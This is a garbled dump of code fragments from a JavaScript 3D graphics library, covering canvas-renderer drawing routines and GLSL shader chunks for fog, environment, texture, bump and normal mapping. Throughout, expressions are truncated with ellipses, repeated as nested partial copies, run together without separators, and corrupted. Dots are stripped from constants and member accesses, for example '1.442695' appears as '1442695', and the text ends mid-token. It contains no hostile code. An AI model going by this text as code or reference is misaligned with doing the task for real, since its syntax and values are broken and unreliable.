asWidth- viewp ... sHeight- viewportHeight_canvas ... ewportY_contex ... Half );_contex ... tHalf )_context.translatethis.setScissorthis.en ...  () {};this.en ... n () {}this.en ... sorTestthis.setClearColor_clearC ... olor );_clearC ... color )_clearColor.set_clearA ... ha : 1;_clearA ... pha : 1alpha ! ... pha : 1alpha !== undefinedthis.se ... olorHexDEPRECATED: .setClearColorHex() is being removed. Use .setClearColor() instead.DEPRECATED:  is being removedthis.se ... lpha );this.se ... alpha )this.ge ... sotropythis.cl ... \r\n\r\n\t};this.cl ... }\r\n\r\n\t}if ( _c ... \r\n\r\n\t\t}_clearB ... = false_clearBox.empty()_clearBox.empty_clearB ... pBox );_clearB ... ipBox )_clearBox.intersect_clearB ... r( 2 );_clearB ... ar( 2 )_clearB ... yScalarif ( _c ... \n\r\n\t\t\t}_clearAlpha < 1_contex ... \n\t\t\t\t);_contex ... \r\n\t\t\t\t)_context.clearRect_clearBox.min.x | 0_clearBox.min.x_clearBox.min.y | 0_clearBox.min.y( _clea ... x ) | 0( _clea ... min.x )_clearB ... x.min.x_clearBox.max.x( _clea ... y ) | 0( _clea ... min.y )_clearB ... x.min.y_clearBox.max.y_clearAlpha > 0setBlen ... ding );setBlen ... nding )setOpacity( 1 );setOpacity( 1 )setFill ...  ')' );setFill ... + ')' )'rgba(' ... a + ')''rgba(' ... arAlpha'rgba(' ... ) + ',''rgba(' ... * 255 )rgba(Math.fl ... * 255 )_clearColor.r * 255_clearColor.r_clearColor.g * 255_clearColor.g_clearColor.b * 255_clearColor.b_context.fillRect_clearB ... mpty();_clearB ... Empty()_clearBox.makeEmptythis.cl ...  () {};this.cl ... n () {}this.clearDepththis.clearStencilthis.rendercamera  ... = falsecamera  ... .Cameraconsole ... ra.' );console ... era.' )'THREE. ... amera.'THREE.CanvasRenderer.render: camera is not an instance of THREE.Camera.render: camera is not an instance of THREEif ( th ... lear();this.au ... == truethis.clear();this.clear()_this.i ... es = 0;_this.i ... ces = 0_this.i ... ertices_this.info.render_this.info_this.i ... r.faces_render ... ents );_render ... ments )_projec ... ments )_projec ... ctScene_elemen ... ements;_elemen ... lements_lights ... lights;_lights ... .lights_camera = camera;_camera = camera_normal ... erse );_normal ... verse )calculateLights();calculateLights()e < ele ++var e = ... .lengthe = 0el = _e ... .length_elements.lengthvar ele ... s[ e ];element ... ts[ e ]_elements[ e ]element.materialmateria ... y === 0_elemBo ... mpty();_elemBox.makeEmpty()_elemBox.makeEmptyif ( el ... \n\r\n\t\t\t}element ... eSprite_v1 = element;_v1 = element_v1.x * ... thHalf;_v1.x * ... dthHalf_v1.x_v1.y * ... htHalf;_v1.y * ... ghtHalf_v1.yrenderS ... rial );renderS ... erial )element ... bleLine_v1 = element.v1;_v1 = element.v1element.v1_v2 = element.v2;_v2 = element.v2element.v2_v1.pos ... thHalf;_v1.pos ... dthHalf_v1.positionScreen.x_v1.positionScreen_v1.pos ... htHalf;_v1.pos ... ghtHalf_v1.positionScreen.y_v2.pos ... thHalf;_v2.pos ... dthHalf_v2.positionScreen.x_v2.positionScreen_v2.pos ... htHalf;_v2.pos ... ghtHalf_v2.positionScreen.y_elemBo ... \t\t\t] );_elemBo ... \t\t\t\t] )_elemBo ... mPoints[\r\n\t\t\t\t ... \r\n\t\t\t\t]if ( _c ... \r\n\t\t\t\t}_clipBo ... == true_clipBo ... emBox )renderL ... rial );renderL ... erial )element ... bleFace_v3 = element.v3;_v3 = element.v3element.v3if ( _v ... ntinue;_v1.pos ... n.z > 1_v1.pos ... .z < -1_v1.positionScreen.z_v2.pos ... n.z > 1_v2.pos ... .z < -1_v2.positionScreen.z_v3.pos ... n.z > 1_v3.pos ... .z < -1_v3.positionScreen.z_v3.positionScreen_v3.pos ... thHalf;_v3.pos ... dthHalf_v3.positionScreen.x_v3.pos ... htHalf;_v3.pos ... ghtHalf_v3.positionScreen.ymateria ... raw > 0expand( ... draw );expand( ... rdraw )renderF ... rial );renderF ... erial )_clearB ... mBox );_clearB ... emBox )_clearBox.union_ambien ... 0, 0 );_ambien ...  0, 0 )_ambientLight.setRGB_direct ... 0, 0 );_direct ...  0, 0 )_direct ... .setRGB_pointL ... 0, 0 );_pointL ...  0, 0 )_pointLights.setRGBl < llvar l = ... .lengthll = _lights.length_lights.lengthvar lig ... s[ l ];light = _lights[ l ]_lights[ l ]var lig ... .color;lightCo ... t.colorif ( li ... \n\r\n\t\t\t}light i ... ntLight_ambien ... olor );_ambien ... Color )_ambientLight.addlight i ... alLight_direct ... olor );_direct ... Color )_direct ... hts.add_pointL ... olor );_pointL ... Color )_pointLights.add_lightC ... olor );_lightC ... color )_lightColor.copyvar lig ... lize();lightPo ... alize()_vector ... alize()_vector ... rmalizelight.matrixWorldvar amo ... tion );amount  ... ition )normal. ... ition )normal.dotif ( am ... ntinue;amount <= 0amount  ... ensity;amount  ... tensitycolor.a ... nt ) );color.a ... unt ) )color.add_lightC ... mount )_lightC ... yScalarvar lig ... orld );lightPo ... World )var amo ... ze() );amount  ... ize() )normal. ... ize() )_vector ... ition )_vector3.subVectorsamount  ... e, 1 );amount  ... ce, 1 )light.d ... ce, 1 )light.distance == 01 - Mat ... ce, 1 )Math.mi ... ce, 1 )position.distanceToamount == 0functio ... /\r\n\r\n\t}{\r\n\r\n\t\t ... /\r\n\r\n\t}setOpac ... city );setOpac ... acity )var sca ... thHalf;scaleX  ... dthHalfelement ... dthHalfelement.scale.xelement.scalevar sca ... htHalf;scaleY  ... ghtHalfelement ... ghtHalfelement.scale.yvar dis ... aleY );dist =  ... caleY )0.5 * M ... caleY )Math.sq ... caleY )scaleX  ...  scaleYscaleX * scaleXscaleY * scaleY_elemBo ... dist );_elemBo ...  dist )_elemBox.min.set_elemBox.minv1.x - distv1.y - dist_elemBox.max.set_elemBox.maxv1.x + distv1.y + dist{ // Ba ... \r\n\r\n\t\t}var tex ... al.map;texture ... ial.maptexture !== nulltexture ... = falsetexture ... pdate )texture ... istenerif ( te ... \n\t\t\t\t\t}texture ... dth > 0texture ... ture );texture ... xture )texture ... date );var pat ... e.id ];pattern ... re.id ]_patter ... re.id ]texture.idpattern ... definedsetFill ... tern );setFill ... ttern )setFill ... 1 )' );setFill ...  1 )' )rgba( 0, 0, 0, 1 )( 0, 0, 0, 1 ) 0, 0, 0, 1 var bit ... .image;bitmap  ... e.imagevar ox  ... fset.x;ox = bi ... ffset.xbitmap. ... ffset.xbitmap.widthtexture.offset.xvar oy  ... fset.y;oy = bi ... ffset.ybitmap. ... ffset.ybitmap.heighttexture.offset.yvar sx  ... peat.x;sx = bi ... epeat.xbitmap. ... epeat.xtexture.repeat.xvar sy  ... peat.y;sy = bi ... epeat.ybitmap. ... epeat.ytexture.repeat.yvar cx  ... X / sx;cx = scaleX / sxscaleX / sxvar cy  ... Y / sy;cy = scaleY / syscaleY / sy_context.save();_context.save()_context.save_contex ... v1.y );_contex ...  v1.y )if ( ma ... tion );materia ... n !== 0_contex ... tion );_contex ... ation )_context.rotate_contex ...  / 2 );_contex ... Y / 2 )- scaleX / 2- scaleX- scaleY / 2- scaleY_contex ... , cy );_contex ... x, cy )_context.scale_contex ... - oy );_contex ...  - oy )- ox- oy_contex ... , sy );_contex ... x, sy )_context.restore();_context.restore()_context.restore{ // no ... \n\r\n\t\t\t}setFill ... le() );setFill ... yle() )materia ... Style()materia ... etStyle_contex ... aleY );_contex ... caleY )_contex ... 1, 1 );_contex ...  1, 1 )setStro ... le() );setStro ... yle() )materia ... text );materia ... ntext )_contex ... Path();_context.beginPath()_context.beginPath_contex ... en.y );_contex ... een.y )_context.moveTo_context.lineTosetLine ... idth );setLine ... width )setLine ... ecap );setLine ... necap )setLine ... join );setLine ... ejoin )var col ... tyle();colorSt ... Style()element ... Style()element ... etStyleelement ... lors[0]element.vertexColorselement ... lors[1]if ( co ... \r\n\t\t\t\t}colorSt ... rStyle2setStro ... yle1 );setStro ... tyle1 )try {\r\n ... \n\t\t\t\t\t}var gra ... \t\t\t\t\t);grad =  ... \t\t\t\t\t\t)_contex ... \t\t\t\t\t\t)_contex ... radientgrad.ad ... yle1 );grad.ad ... tyle1 )grad.addColorStopgrad.ad ... yle2 );grad.ad ... tyle2 )catch ( ... \n\t\t\t\t\t}grad = colorStyle1;grad = colorStyle1setStro ... grad );setStro ...  grad )_context.stroke();_context.stroke()_context.stroke_elemBo ...  * 2 );_elemBo ... h * 2 )_elemBo ... yScalarmateria ... dth * 2setDash ... Size );setDash ... pSize )setDash ... null );setDash ...  null )_this.i ... s += 3;_this.i ... es += 3_this.i ... ces ++;_this.i ... aces ++_v1x =  ... reen.x;_v1x =  ... creen.x_v1y =  ... reen.y;_v1y =  ... creen.y_v2x =  ... reen.x;_v2x =  ... creen.x_v2y =  ... reen.y;_v2y =  ... creen.y_v3x =  ... reen.x;_v3x =  ... creen.x_v3y =  ... reen.y;_v3y =  ... creen.ydrawTri ... _v3y );drawTri ...  _v3y )( mater ... == nullmateria ... == null_diffus ... olor );_diffus ... color )_diffuseColor.copy_emissi ... sive );_emissi ... ssive )_emissiveColor.copymateria ... eColors_diffus ... ultiplyelement.color_color. ... ight );_color. ... Light )_color.copy_centro ... r( 3 );_centro ... ar( 3 )_centro ... eScalar_centro ... World )_centro ... d ).add_centroid.copyv1.positionWorldv2.positionWorldv3.positionWorldcalcula ... olor );calcula ... color )element.normalModel_color. ... olor );_color. ... Color )_color. ... r ).add_color.multiplystrokeP ... ejoin )fillPath( _color )materia ... Mappingmaterial.map.mapping_uvs = element.uvs;_uvs = element.uvselement.uvspattern ... .map );pattern ... l.map )_uvs[ uv1 ].x_uvs[ uv1 ]_uvs[ uv1 ].y_uvs[ uv2 ].x_uvs[ uv2 ]_uvs[ uv2 ].y_uvs[ uv3 ].x_uvs[ uv3 ]_uvs[ uv3 ].ymateria ... mapping_normal ... Matrix3_normal ... uv1 ] )_normal.copyelement ... [ uv1 ]element ... lsModel_uv1x = ...  + 0.5;_uv1x = ... x + 0.50.5 * _ ... x + 0.50.5 * _normal.x_normal.x_uv1y = ...  + 0.5;_uv1y = ... y + 0.50.5 * _ ... y + 0.50.5 * _normal.y_normal.y_normal ... uv2 ] )element ... [ uv2 ]_uv2x = ...  + 0.5;_uv2x = ... x + 0.5_uv2y = ...  + 0.5;_uv2y = ... y + 0.5_normal ... uv3 ] )element ... [ uv3 ]_uv3x = ...  + 0.5;_uv3x = ... x + 0.5_uv3y = ...  + 0.5;_uv3y = ... y + 0.5pattern ... vMap );pattern ... nvMap )- 0.5 * ... x + 0.5- 0.5 * _normal.x- 0.5 * ... y + 0.5- 0.5 * _normal.y_color. ... color )_color. ... .far );_color. ... a.far )_color.r_color.g_color.b1 - smo ... a.far )smooths ... a.far )v1.posi ... creen.wv1.positionScreen.w_camera.near_camera.far_normal ... Model )_color. ...  0.5 );_color. ... ( 0.5 )_color. ... dScalar_color. ... yScalar_color. ... mal.z )_color.setRGB_normal.z_color. ... 1, 1 );_color. ...  1, 1 )_contex ... , y0 );_contex ... 0, y0 )_contex ... , y1 );_contex ... 1, y1 )_contex ... , y2 );_contex ... 2, y2 )_context.closePath()_context.closePathcolor.getStyle()color.getStylelinewidth * 2_context.fill();_context.fill()_context.filltexture ... rget );texture ... arget )var rep ... apping;repeatX ... rappingrepeatY ... rappingvar ima ... .image;image = ... e.imagevar can ... vas' );canvas  ... nvas' )canvas. ... .width;canvas. ... e.widthcanvas.widthcanvas. ... height;canvas. ... .heightcanvas.heightvar con ... '2d' );context ...  '2d' )canvas. ...  '2d' )canvas.getContextcontext ... ight );context ... eight )context.setTransformcontext ... 0, 0 );context ...  0, 0 )context.drawImage_patter ... '\r\n\t\t);_patter ... t'\r\n\t\t)_contex ... t'\r\n\t\t)_contex ... PatternrepeatX ... repeat'repeatX ... == truerepeatX === truerepeatY === truerepeatX ... = falserepeatY === falserepeat-xrepeatX === falserepeat-yno-repeatif ( te ... return;texture ... Textureif ( te ... \r\n\r\n\t\t}setFill ... ,1)' );setFill ... 0,1)' )rgba(0,0,0,1)(0,0,0,1)0,0,0,1var a,  ... peat.y;offsetX ... epeat.xtexture ... epeat.xoffsetY ... epeat.ytexture ... epeat.ywidth = ... epeat.xheight  ... epeat.yu0 = (  ...  width;u0 = (  ... * width( u0 +  ... * width( u0 + offsetX )u0 + offsetXv0 = (  ... height;v0 = (  ...  height( v0 +  ...  height( v0 + offsetY )v0 + offsetYu1 = (  ...  width;u1 = (  ... * width( u1 +  ... * width( u1 + offsetX )u1 + offsetXv1 = (  ... height;v1 = (  ...  height( v1 +  ...  height( v1 + offsetY )v1 + offsetYu2 = (  ...  width;u2 = (  ... * width( u2 +  ... * width( u2 + offsetX )u2 + offsetXv2 = (  ... height;v2 = (  ...  height( v2 +  ...  height( v2 + offsetY )v2 + offsetYx1 -= x0;x1 -= x0y1 -= y0;y1 -= y0x2 -= x0;x2 -= x0y2 -= y0;y2 -= y0u1 -= u0;u1 -= u0v1 -= v0;v1 -= v0u2 -= u0;u2 -= u0v2 -= v0;v2 -= v0det = u ... 2 * v1;det = u ... u2 * v1u1 * v2 - u2 * v1u1 * v2u2 * v1if ( de ... return;idet = 1 / det;idet = 1 / deta = ( v ... * idet;a = ( v ...  * idet( v2 *  ...  * idet( v2 *  ...  * x2 )v2 * x1 - v1 * x2v2 * x1v1 * x2b = ( v ... * idet;b = ( v ...  * idet( v2 *  ...  * y2 )v2 * y1 - v1 * y2v2 * y1v1 * y2c = ( u ... * idet;c = ( u ...  * idet( u1 *  ...  * idet( u1 *  ...  * x1 )u1 * x2 - u2 * x1u1 * x2u2 * x1d = ( u ... * idet;d = ( u ...  * idet( u1 *  ...  * y1 )u1 * y2 - u2 * y1u1 * y2u2 * y1e = x0  ... c * v0;e = x0  ...  c * v0x0 - a * u0 - c * v0x0 - a * u0a * u0c * v0f = y0  ... d * v0;f = y0  ...  d * v0y0 - b * u0 - d * v0y0 - b * u0b * u0d * v0_contex ... e, f );_contex ...  e, f )_context.transformvar a,  ... ht - 1;width = ... dth - 1image.width - 1height  ... ght - 1image.height - 1u0 *= width;u0 *= widthv0 *= height;v0 *= heightu1 *= width;u1 *= widthv1 *= height;v1 *= heightu2 *= width;u2 *= widthv2 *= height;v2 *= height_context.clip();_context.clip()_context.clip_contex ... 0, 0 );_contex ...  0, 0 )_context.drawImagevar x = ... , idet;x = v2.x - v1.xv2.x - v1.xv2.xy = v2.y - v1.yv2.y - v1.yv2.ydet = x * x + y * yidet =  ...  det );idet =  ... ( det )pixels  ... ( det )Math.sqrt( det )x *= idet;x *= idety *= idet;y *= idetv2.x += x;v2.x += xv2.y += y;v2.y += yv1.x -= x;v1.x -= xv1.y -= y;v1.y -= y_contex ... = value_contex ...  value;_context.globalAlphaif ( va ... \n\r\n\t\t\t}value = ... lending_contex ... -over';_contex ... e-over'source-over_contex ... ghter';_contex ... ighter'lighter_contex ... arker';_contex ... darker'darker_context.lineWidth_context.lineCap_context.lineJoin_context.strokeStyle_context.fillStyle_contex ... zeValue_contex ... ue ] );_contex ... lue ] )[ dashS ... Value ]_contex ... eValue;THREE.S ... )\r\n\r\n};THREE.S ... ")\r\n\r\n}THREE.ShaderChunk{\r\n\r\n\t/ ... ")\r\n\r\n}fog_par ... n("\n")#ifdef USE_FOG"\tunifo ... Color;"	uniform vec3 fogColor;"\t#ifdef FOG_EXP2"	#ifdef FOG_EXP2"\t\tunif ... nsity;"		uniform float fogDensity;"\t#else"	#else"\t\tunif ... gNear;"		uniform float fogNear;"\t\tunif ... ogFar;"		uniform float fogFar;"\t#endif"	#endif#endiffog_fra ... n("\n")"\t#ifde ... UF_EXT"	#ifdef USE_LOGDEPTHBUF_EXT"\t\tfloa ... ord.w;"		float depth = gl_FragDepthEXT / gl_FragCoord.w;		float depth = gl_FragDepthEXT / gl_FragCoordw;		float depth = gl_FragCoord.z / gl_FragCoord.w;		float depth = gl_FragCoordz / gl_FragCoord"\t\tcons ... 42695;"		const float LOG2 = 1.442695;		const float LOG2 = 1442695;"\t\tfloa ... OG2 );"		float fogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );		float fogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 ) - fogDensity * fogDensity * depth * depth * LOG2  - fogDensity fogDensity depth LOG2 "\t\tfogF ... 1.0 );"		fogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );		fogFactor = 10 - clamp( fogFactor, 0.0, 1.0 ) fogFactor, 0.0, 1.0  fogFactor, 00, 1"\t\tfloa ... pth );"		float fogFactor = smoothstep( fogNear, fogFar, depth );		float fogFactor = smoothstep( fogNear, fogFar, depth ) fogNear, fogFar, depth "\tgl_Fr ... tor );"	gl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );	gl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor ) gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor  gl_FragColor, vec4( fogColor, gl_FragColor.w ) fogColor, gl_FragColor.w  fogColor, gl_FragColorw , fogFactor envmap_ ... n("\n")#ifdef USE_ENVMAP"\tunifo ... ivity;"	uniform float reflectivity;"\tunifo ... nvMap;"	uniform samplerCube envMap;	uniform float flipEnvMap;"\tunifo ... mbine;"	uniform int combine;"\t#if d ... LMAP )"	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP )	#if defined( USE_BUMPMAP ) 	#if defined( USE_BUMPMAP ) USE_BUMPMAP  defined( USE_NORMALMAP ) defined( USE_NORMALMAP ) USE_NORMALMAP "\t\tunif ... fract;"		uniform bool useRefract;"\t\tunif ... Ratio;"		uniform float refractionRatio;"\t\tvary ... flect;"		varying vec3 vReflect;"\tvec3 reflectVec;"	vec3 reflectVec;"\t\tvec3 ... ion );"		vec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );		vec3 cameraToVertex = normalize( vWorldPosition - cameraPosition ) vWorldPosition - cameraPosition "\t\tvec3 ... x ) );"		vec3 worldNormal = normalize( vec3( vec4( normal, 0.0 ) * viewMatrix ) );		vec3 worldNormal = normalize( vec3( vec4( normal, 0.0 ) * viewMatrix ) ) vec3( vec4( normal, 0.0 ) * viewMatrix )  vec3( vec4( normal, 0.0 ) * viewMatrix ) vec4( normal, 0.0 ) * viewMatrix ( normal, 0.0 ) normal, 0.0  normal, 0 viewMatrix "\t\tif ( ... ct ) {"		if ( useRefract ) {"\t\t\tref ... tio );"			reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );			reflectVec = refract( cameraToVertex, worldNormal, refractionRatio ) cameraToVertex, worldNormal, refractionRatio "\t\t} else { "		} else { "\t\t\tref ... mal );"			reflectVec = reflect( cameraToVertex, worldNormal );			reflectVec = reflect( cameraToVertex, worldNormal ) cameraToVertex, worldNormal "\t\t}"		}"\t\trefl ... flect;"		reflectVec = vReflect;"\t#ifde ... _SIDED"	#ifdef DOUBLE_SIDED"\t\tfloa ... g ) );"		float flipNormal = ( -1.0 + 2.0 * float( gl_FrontFacing ) );		float flipNormal = ( -1.0 + 2.0 * float( gl_FrontFacing ) ) -1.0 + 2.0 * float( gl_FrontFacing )  -1 2 float( gl_FrontFacing ) gl_FrontFacing "\t\tvec4 ... z ) );"		vec4 cubeColor = textureCube( envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );		vec4 cubeColor = textureCube( envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) ) envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz )  envMap, flipNormal( flipEnvMap * reflectVec.x, reflectVec.yz ) flipEnvMap * reflectVec.x, reflectVec.yz  flipEnvMap reflectVecx, reflectVecyz 		vec4 cubeColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) ) envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz )  envMap, vec3"\t#ifde ... _INPUT"	#ifdef GAMMA_INPUT"\t\tcube ... r.xyz;"		cubeColor.xyz *= cubeColor.xyz;		cubeColorxyz= cubeColorxyz;"\tif (  ...  1 ) {"	if ( combine == 1 ) {"\t\tgl_F ... ity );"		gl_FragColor.xyz = mix( gl_FragColor.xyz, cubeColor.xyz, specularStrength * reflectivity );		gl_FragColorxyz = mix( gl_FragColor.xyz, cubeColor.xyz, specularStrength * reflectivity ) gl_FragColor.xyz, cubeColor.xyz, specularStrength * reflectivity  gl_FragColorxyz, cubeColorxyz, specularStrength reflectivity "\t} els ...  2 ) {"	} else if ( combine == 2 ) {"\t\tgl_F ... ivity;"		gl_FragColor.xyz += cubeColor.xyz * specularStrength * reflectivity; specularStrength reflectivity;"\t} else {"	} else {		gl_FragColor.xyz = mix( gl_FragColor.xyz, gl_FragColor.xyz * cubeColor.xyz, specularStrength * reflectivity );( gl_FragColor.xyz, gl_FragColor.xyz * cubeColor.xyz, specularStrength * reflectivity ) gl_FragColor.xyz, gl_FragColor.xyz * cubeColor.xyz, specularStrength * reflectivity xyz, gl_FragColor cubeColor"\t}"	}"#if de ... LMAP )"#if defined( USE_ENVMAP ) && ! defined( USE_BUMPMAP ) && ! defined( USE_NORMALMAP )#if defined( USE_ENVMAP ) USE_ENVMAP  && ! defined"\tvaryi ... flect;"	varying vec3 vReflect;"\tunifo ... Ratio;"	uniform float refractionRatio;"\tunifo ... fract;"	uniform bool useRefract;worldpo ... n("\n")"#if de ... WMAP )"#if defined( USE_ENVMAP ) || defined( PHONG ) || defined( LAMBERT ) || defined ( USE_SHADOWMAP )#if defined( USE_ENVMAP )  defined( PHONG ) ( PHONG ) PHONG  defined( LAMBERT ) ( LAMBERT ) LAMBERT  defined ( USE_SHADOWMAP ) defined ( USE_SHADOWMAP ) USE_SHADOWMAP "\t#ifde ... INNING"	#ifdef USE_SKINNING"\t\tvec4 ... inned;"		vec4 worldPosition = modelMatrix * skinned;		vec4 worldPosition = modelMatrix skinned;"\t#if d ... NING )"	#if defined( USE_MORPHTARGETS ) && ! defined( USE_SKINNING )( USE_MORPHTARGETS ) USE_MORPHTARGETS ( USE_SKINNING ) USE_SKINNING "\t\tvec4 ... 1.0 );"		vec4 worldPosition = modelMatrix * vec4( morphed, 1.0 );( morphed, 1.0 ) morphed, 1.0  morphed, 1"\t#if ! ... NING )"	#if ! defined( USE_MORPHTARGETS ) && ! defined( USE_SKINNING )	#if ! defined		vec4 worldPosition = modelMatrix * vec4( position, 1.0 );"\tvec3  ... ormal;"	vec3 worldNormal = mat3( modelMatrix[ 0 ].xyz, modelMatrix[ 1 ].xyz, modelMatrix[ 2 ].xyz ) * objectNormal;	vec3 worldNormal = mat3( modelMatrix[ 0 ].xyz, modelMatrix[ 1 ].xyz, modelMatrix[ 2 ].xyz ) modelMatrix[ 0 ].xyz, modelMatrix[ 1 ].xyz, modelMatrix[ 2 ].xyz  modelMatrix[ 0 ]xyz, modelMatrix[ 1 ][ 2 ]xyz  objectNormal;"\tworld ... mal );"	worldNormal = normalize( worldNormal );	worldNormal = normalize( worldNormal ) worldNormal "\tvec3  ... ion );"	vec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );	vec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition ) worldPosition.xyz - cameraPosition  worldPositionxyz - cameraPosition "\tif (  ... ct ) {"	if ( useRefract ) {"\t\tvRef ... tio );"		vReflect = refract( cameraToVertex, worldNormal, refractionRatio );		vReflect = refract"\t\tvRef ... mal );"		vReflect = reflect( cameraToVertex, worldNormal );		vReflect = reflectmap_par ... n("\n")map_par ... ragment#ifdef USE_MAP"\tunifo ... D map;"	uniform sampler2D map;"\tgl_Fr ... y ) );"	gl_FragColor = gl_FragColor * texture2D( map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) );	gl_FragColor = gl_FragColor texture2D( map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) ) map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y )  map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) gl_PointCoord.x, 1.0 - gl_PointCoord.y  gl_PointCoordx, 10 - gl_PointCoordy "#if de ... RMAP )"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP )#if defined( USE_MAP ) ( USE_MAP ) USE_MAP  defined( USE_BUMPMAP )  defined( USE_NORMALMAP )  defined( USE_SPECULARMAP )( USE_SPECULARMAP ) USE_SPECULARMAP "\tvarying vec2 vUv;"	varying vec2 vUv;"\tunifo ... epeat;"	uniform vec4 offsetRepeat;map_ver ... n("\n")"\tvUv = ... at.xy;"	vUv = uv * offsetRepeat.zw + offsetRepeat.xy;	vUv = uv offsetRepeatzwxy;map_fra ... n("\n")"\tvec4  ... vUv );"	vec4 texelColor = texture2D( map, vUv );	vec4 texelColor = texture2D( map, vUv ) map, vUv "\t\ttexe ... r.xyz;"		texelColor.xyz *= texelColor.xyz;		texelColor= texelColor"\tgl_Fr ... Color;"	gl_FragColor = gl_FragColor * texelColor; texelColor;lightma ... n("\n")lightma ... ragment"#ifdef ... GHTMAP"#ifdef USE_LIGHTMAP"\tvaryi ...  vUv2;"	varying vec2 vUv2;"\tunifo ... htMap;"	uniform sampler2D lightMap;"\tgl_Fr ... Uv2 );"	gl_FragColor = gl_FragColor * texture2D( lightMap, vUv2 );( lightMap, vUv2 ) lightMap, vUv2 "\tvUv2 = uv2;"	vUv2 = uv2;bumpmap ... n("\n")bumpmap ... ragment#ifdef USE_BUMPMAP"\tunifo ... mpMap;"	uniform sampler2D bumpMap;"\tunifo ... Scale;"	uniform float bumpScale;"\tvec2  ... wd() {"	vec2 dHdxy_fwd() {"\t\tvec2 ... vUv );"		vec2 dSTdx = dFdx( vUv );		vec2 dSTdx = dFdx( vUv ) vUv 		vec2 dSTdy = dFdy( vUv );		vec2 dSTdy = dFdy"\t\tfloa ... v ).x;"		float Hll = bumpScale * texture2D( bumpMap, vUv ).x;		float Hll = bumpScale( bumpMap, vUv ) bumpMap, vUv x;"\t\tfloa ... - Hll;"		float dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;		float dBx = bumpScale( bumpMap, vUv + dSTdx ) bumpMap, vUv + dSTdx  bumpMap, vUv dSTdx x - Hll;		float dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;		float dBy = bumpScale( bumpMap, vUv + dSTdy ) bumpMap, vUv + dSTdy  dSTdy "\t\tretu ... dBy );"		return vec2( dBx, dBy );		return vec2( dBx, dBy ) dBx, dBy "\tvec3  ... xy ) {"	vec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {"\t\tvec3 ... pos );"		vec3 vSigmaX = dFdx( surf_pos );		vec3 vSigmaX = dFdx( surf_pos ) surf_pos 		vec3 vSigmaY = dFdy( surf_pos );		vec3 vSigmaY = dFdy"\t\tvec3 ... _norm;"		vec3 vN = surf_norm;"\t\tvec3 ...  vN );"		vec3 R1 = cross( vSigmaY, vN );		vec3 R1 = cross( vSigmaY, vN ) vSigmaY, vN "\t\tvec3 ... maX );"		vec3 R2 = cross( vN, vSigmaX );		vec3 R2 = cross( vN, vSigmaX ) vN, vSigmaX "\t\tfloa ...  R1 );"		float fDet = dot( vSigmaX, R1 );		float fDet = dot( vSigmaX, R1 ) vSigmaX, R1 "\t\tvec3 ...  R2 );"		vec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );		vec3 vGrad = sign( fDet ) fDet ( dHdxy.x * R1 + dHdxy.y * R2 ) dHdxy.x * R1 + dHdxy.y * R2  dHdxy R1 R2 "\t\tretu ... rad );"		return normalize( abs( fDet ) * surf_norm - vGrad );		return normalize( abs( fDet ) * surf_norm - vGrad ) abs( fDet ) * surf_norm - vGrad  abs surf_norm - vGrad normalm ... n("\n")normalm ... ragment"#ifdef ... MALMAP"#ifdef USE_NORMALMAP"\tunifo ... alMap;"	uniform sampler2D normalMap;	uniform vec2 normalScale;"\tvec3  ... rm ) {"	vec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {"\t\tvec3 ... xyz );"		vec3 q0 = dFdx( eye_pos.xyz );		vec3 q0 = dFdx( eye_pos.xyz ) eye_pos.xyz  eye_pos		vec3 q1 = dFdy( eye_pos.xyz );		vec3 q1 = dFdy"\t\tvec2 ... .st );"		vec2 st0 = dFdx( vUv.st );		vec2 st0 = dFdx( vUv.st ) vUv.st  vUvst 		vec2 st1 = dFdy( vUv.st );		vec2 st1 = dFdy"\t\tvec3 ... 0.t );"		vec3 S = normalize(  q0 * st1.t - q1 * st0.t );		vec3 S = normalize(  q0 * st1.t - q1 * st0.t )  q0 * st1.t - q1 * st0.t   q0 st1t - q1 st0t "\t\tvec3 ... 0.s );"		vec3 T = normalize( -q0 * st1.s + q1 * st0.s );		vec3 T = normalize( -q0 * st1.s + q1 * st0.s ) -q0 * st1.s + q1 * st0.s  -q0 q1s "\t\tvec3 ... orm );"		vec3 N = normalize( surf_norm );		vec3 N = normalize( surf_norm ) surf_norm "\t\tvec3 ... - 1.0;"		vec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;		vec3 mapN = texture2D( normalMap, vUv ) normalMap, vUv 0 - 10;"\t\tmapN ... pN.xy;"		mapN.xy = normalScale * mapN.xy;		mapNxy = normalScale mapN"\t\tmat3 ... , N );"		mat3 tsn = mat3( S, T, N );		mat3 tsn = mat3( S, T, N ) S, T, N "\t\tretu ... apN );"		return normalize( tsn * mapN );( tsn * mapN ) tsn * mapN  tsn mapN specula ... n("\n")specula ... ragment"#ifdef ... LARMAP"#ifdef USE_SPECULARMAP"\tunifo ... arMap;"	uniform sampler2D specularMap;"float  ... ength;"float 